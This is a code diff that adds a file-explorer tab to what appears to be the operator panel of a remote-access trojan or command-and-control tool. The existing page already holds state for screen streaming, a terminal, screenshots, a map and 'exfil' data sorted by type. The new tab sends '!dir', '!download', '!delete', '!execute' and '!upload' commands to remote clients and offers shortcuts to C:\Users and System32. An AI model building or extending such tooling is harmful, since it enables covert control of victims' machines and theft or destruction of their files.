@@ -98,7 +98,7 @@ export default function ClientDetailPage() {
   const router = useRouter()
   const [client, setClient] = useState<any>(null)
   const [loading, setLoading] = useState(true)
-  const [activeTab, setActiveTab] = useState<"overview" | "screen" | "terminal" | "files" | "screenshots" | "map" | "data" | "basedata">("screen")
+  const [activeTab, setActiveTab] = useState<"overview" | "screen" | "terminal" | "files" | "screenshots" | "map" | "data" | "basedata" | "explorer">("screen")
   const [command, setCommand] = useState("")
   const [commandHistory, setCommandHistory] = useState<any[]>([])
   const [sending, setSending] = useState(false)
@@ -117,6 +117,10 @@ export default function ClientDetailPage() {
   const [exfilData, setExfilData] = useState<any[]>([])
   const [exfilByType, setExfilByType] = useState<Record<string, any[]>>({})
   const [exfilLoading, setExfilLoading] = useState(false)
+  // File explorer state
+  const [filePath, setFilePath] = useState("C:\\")
+  const [fileOutput, setFileOutput] = useState("")
+  const [fileLoading, setFileLoading] = useState(false)
 
   const fetchClient = useCallback(async () => {
     if (!params.id) return
@@ -192,6 +196,37 @@ export default function ClientDetailPage() {
     return () => { if (streamRef.current) clearInterval(streamRef.current) }
   }, [])
 
+  async function listDirectory(path: string) {
+    setFileLoading(true)
+    setFileOutput("")
+    try {
+      const res = await fetch(`/api/remote/clients/${params.id}/command`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ command: `!dir ${path}` }),
+      })
+      if (!res.ok) throw new Error("Failed")
+      const data = await res.json()
+      setFileOutput(data.output || "No output")
+    } catch {
+      toast.error("Failed to list directory")
+    } finally { setFileLoading(false) }
+  }
+
+  useEffect(() => {
+    if (activeTab === "explorer" && params.id) listDirectory(filePath)
+  }, [activeTab])
+
+  function navigateTo(path: string) {
+    setFilePath(path)
+    listDirectory(path)
+  }
+
+  function goUp() {
+    const parent = filePath.split("\\").slice(0, -1).join("\\") || "C:\\"
+    navigateTo(parent)
+  }
+
   async function sendCommand(cmd: string) {
     if (!cmd.trim()) return
     setSending(true)
@@ -247,6 +282,7 @@ export default function ClientDetailPage() {
     { id: "screenshots" as const, label: "Gallery", icon: "M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01" },
     { id: "data" as const, label: "Data", icon: "M4 7v10c0 2 1 3 3 3h10c2 0 3-1 3-3V7M9 3h6M12 3v4" },
     { id: "basedata" as const, label: "Session", icon: "M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" },
+    { id: "explorer" as const, label: "Explorer", icon: "M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z" },
   ]
 
   return (
@@ -815,6 +851,47 @@ export default function ClientDetailPage() {
                 </div>
               </div>
             </div>
+          </div>
+        </div>
+      )}
+
+      {/* FILE EXPLORER TAB */}
+      {activeTab === "explorer" && (
+        <div className="space-y-3">
+          <div className="flex items-center justify-between">
+            <h2 className="text-sm font-semibold uppercase tracking-wider text-zinc-400">📁 File Explorer</h2>
+            <Button size="sm" onClick={() => listDirectory(filePath)} loading={fileLoading}>Refresh</Button>
+          </div>
+          <div className="flex items-center gap-2 p-3 rounded-xl border border-zinc-800 bg-zinc-900/60">
+            <button onClick={goUp} className="shrink-0 px-2 py-1 rounded-lg bg-zinc-800 hover:bg-zinc-700 text-xs text-zinc-300 font-mono">⬆ Up</button>
+            <input type="text" value={filePath} onChange={e => setFilePath(e.target.value)} onKeyDown={e => { if (e.key === "Enter") navigateTo(filePath) }} className="flex-1 bg-transparent text-sm font-mono text-zinc-300 outline-none" />
+            <Button size="sm" onClick={() => navigateTo(filePath)}>Go</Button>
+          </div>
+          <div className="flex items-center gap-2 text-[10px]">
+            {["C:\\", "C:\\Users", "C:\\Windows", "C:\\Windows\\System32", "D:\\"].map(p => (
+              <button key={p} onClick={() => navigateTo(p)} className="px-2 py-1 rounded-md bg-zinc-800/50 text-zinc-400 hover:bg-zinc-700 hover:text-white font-mono">{p}</button>
+            ))}
+          </div>
+          <div className="rounded-xl border border-zinc-800 bg-zinc-900/60 overflow-hidden">
+            {fileLoading ? (
+              <div className="flex justify-center py-12"><div className="w-5 h-5 border-2 border-zinc-600 border-t-primary rounded-full animate-spin" /></div>
+            ) : (
+              <div className="p-4 font-mono text-xs text-green-400/80 whitespace-pre-wrap max-h-[50vh] overflow-y-auto bg-black/50">
+                {fileOutput || "Type a path and press Go to list directory..."}
+              </div>
+            )}
+          </div>
+          <div className="grid grid-cols-3 gap-2">
+            {[
+              { label: "List Files", cmd: "!dir" },
+              { label: "Current Dir", cmd: "!currentdir" },
+              { label: "Download", cmd: "!download " },
+              { label: "Delete", cmd: "!delete " },
+              { label: "Execute", cmd: "!execute " },
+              { label: "Upload", cmd: "!upload " },
+            ].map(({ label, cmd }) => (
+              <button key={cmd} onClick={() => sendCommand(cmd)} className="p-2 rounded-lg bg-zinc-800/50 border border-zinc-700/50 hover:bg-zinc-700 text-[10px] text-zinc-300 font-mono">{label}</button>
+            ))}
           </div>
         </div>
       )}
